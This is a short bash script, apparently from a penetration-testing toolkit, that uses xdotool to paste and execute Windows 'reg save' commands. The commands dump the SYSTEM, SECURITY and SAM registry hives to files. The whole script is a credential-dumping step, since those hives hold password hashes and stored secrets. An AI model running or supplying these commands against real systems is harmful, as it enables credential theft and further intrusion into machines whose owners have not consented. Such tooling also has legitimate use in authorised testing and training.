#!/bin/bash

"""
Registry: Save SYSTEM, SECURITY, and SAM hives.
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "reg save HKLM\SYSTEM SYSTEM.SAVE"
xdotool key Return

paste_command "reg save HKLM\SECURITY SECURITY.SAVE"
xdotool key Return

paste_command "reg save HKLM\SAM SAM.SAVE"
xdotool key Return
